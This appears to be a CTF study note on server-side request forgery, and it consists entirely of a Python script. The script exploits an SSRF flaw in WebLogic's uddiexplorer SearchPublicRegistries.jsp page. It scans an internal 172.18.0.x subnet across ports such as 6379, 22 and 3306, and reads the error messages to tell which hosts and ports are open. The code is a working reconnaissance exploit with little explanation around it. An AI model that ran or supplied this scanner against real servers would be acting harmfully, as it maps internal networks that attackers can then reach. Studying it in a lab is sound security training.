# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSRF漏洞.md
# TITLE: 0x01 SSRF漏洞介绍
# CATEGORY: web

import requests
url = "http://192.168.1.166:7001/uddiexplorer/SearchPublicRegistries.jsp"
ports = [6378,6379,22,25,80,8080,8888,8000, 7001, 7002,23,25,3306,2333]
for i in range(1,255):
	for port in ports:
		params = dict(
			rdoSearch = "name",
			txtSearchname = "sdf",
			selfor = "Business+location",
			btnSubmit = "Search",
			operator = "http://172.18.0.{}:{}".format(i,port))
		try:
			r = requests.get(url, params=params, timeout = 3)
		except:
			pass
        
		if 'could not connect over HTTP to server' not in r.text and 'No route to host' not in r.text:
			print('[*] http://172.18.0.{}:{}'.format(i,port))
		else:
			pass
